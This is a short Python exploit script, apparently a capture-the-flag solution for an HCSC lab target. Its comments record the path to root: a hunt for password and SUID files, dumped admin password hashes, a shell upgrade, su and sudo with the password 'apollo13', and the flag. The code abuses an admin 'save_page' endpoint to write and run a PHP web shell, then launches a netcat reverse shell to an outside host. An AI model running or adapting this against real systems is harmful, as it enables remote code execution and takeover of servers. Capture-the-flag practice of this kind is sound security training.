import readline
from subprocess import Popen, PIPE
import sys
import random
import pwn
import time
import fileinput
import requests

# grep -rnw '/' -e 'password' 2>/dev/null

# find / -user root -perm -4000


# ---

# $ cat /tmp/setup_collage.sql
# ... 
# INSERT INTO `users` (`id`, `name`, `username`, `password`, `type`) VALUES
# (1, 'Administrator', 'admin', '0192023a7bbd73250516f069df18b500', 1);

# --
# --INSERT INTO `users` (`id`, `name`, `username`, `password`, `type`) VALUES
# --(2, 'Apollo', 'apollo', '64024c4afaac000b12ddcd2e0c51512b', 1);
# --
# ....

# python -c 'import pty; pty.spawn("/bin/sh")'
# su apollo
# Password: apollo13
# apollo@46c178a03aa8:/tmp$
# apollo@46c178a03aa8:/$ sudo -Siu root
# sudo -Siu root
# [sudo] password for apollo: apollo13
# root@46c178a03aa8:~# cat flag.txt
# {HCSC}-Ro07:Fl4G_oN$Ap0llO


def run(cmd): 
    server = '10.10.3.10:3123'
    cmd = cmd.rstrip() # + ' 2>&1'
    data=  {
        "page_content": '<?php system("'+cmd +'");',
        "filename": "hello.php"
    }
    
    requests.post(f'http://{server}/admin/ajax.php?action=save_page', data=data)
    rsp = requests.get(f'http://{server}/hello.php')
    data =  {
        "page_content": '',
        "filename": "hello.php"
    }

    requests.post(f'http://{server}/admin/ajax.php?action=save_page', data=data)
    print(rsp.text)

run('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc csokavar.hu 11111 4242 >/tmp/f')

